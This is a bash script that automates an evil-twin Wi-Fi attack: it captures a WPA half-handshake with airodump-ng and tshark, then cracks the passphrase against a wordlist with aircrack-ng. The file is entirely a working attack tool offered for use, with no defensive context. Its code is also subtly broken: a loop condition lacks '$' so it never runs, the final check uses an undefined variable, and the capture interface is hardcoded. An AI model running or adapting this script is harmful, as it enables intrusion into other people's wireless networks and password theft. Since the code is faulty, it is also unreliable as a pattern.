#!/bin/bash

if [ $# -ne 3 ]; then
    echo "usage: ./half-handshake.sh <wireless interface> <target SSID> <wordlist>"
    exit 1 # exit 0 means success, nonzero means failure
fi

IFACE=$1
SSID=$2
WORDLIST=$3

clear
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $IFACE &> /dev/null

TWIN_FOUND=false
while [ TWIN_FOUND = false ]; do
    read -p "Evil Twin deployed? [Enter]"

    # listen to signals on antenna
    sudo airodump-ng $IFACE -w dump --output-format csv -K 1 &> /dev/null &
    sleep 4
    sudo killall airodump-ng

    # identify channel and bssid
    BSSID=$(grep "$SSID" dump-01.csv | awk -F',' '{print $1}') # -m 1 for first result
    CHANNEL=$(grep "$SSID" dump-01.csv | awk -F',' '{print $4}')
    rm -f dump-01.csv

    if [[ "$BSSID" && "$CHANNEL" ]]; then
        TWIN_FOUND=true
    else
        echo "Interface didn't hear $SSID"
    fi
done

HANDSHAKE_DETECTED=false
while [ $HANDSHAKE_DETECTED = false ]; do
    clear
    echo $SSID is on channel $CHANNEL with BSSID $BSSID
    read -p "Ready to capture half-handshake. Enter capture length in seconds to begin: " CAPTIME

    sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & # -K 1 means non-interactive mode
    tshark -i wlan0 -w raw.pcapng -a duration:$CAPTIME &> /dev/null &

    printf "Capturing... %3u" $CAPTIME # %3u means unsigned int and pad to 3 chars wide
    while [ $CAPTIME -gt 0 ]; do
        sleep 1
        CAPTIME=$((CAPTIME-1))
        printf "\b\b\b%3u" $CAPTIME # backspace 3 times to update countdown in-place
    done
    printf "\n"

    sudo killall airodump-ng

    # filter pcap
    tshark -r raw.pcapng -F pcap -w half-handshake.pcap "wlan.addr == $BSSID"
    rm -f raw.pcapng

    # if no handshake in capture
    if ! [[ $(tshark -r half-handshake.pcap eapol) ]]; then
        clear
        while true; do
            read -p "No half-handshake detected in capture. Try again? [y/n]" yn
            case $yn in
                [Yy]* ) continue 2 ;;
                [Nn]* ) break 2 ;;
                * )
            esac
        done
    else
        HANDSHAKE_DETECTED=true
    fi
done

# clean up
sudo airmon-ng stop $IFACE &> /dev/null

if [ $DETECTED = true ]; then
        sudo aircrack-ng half-handshake.pcap -w $WORDLIST
fi
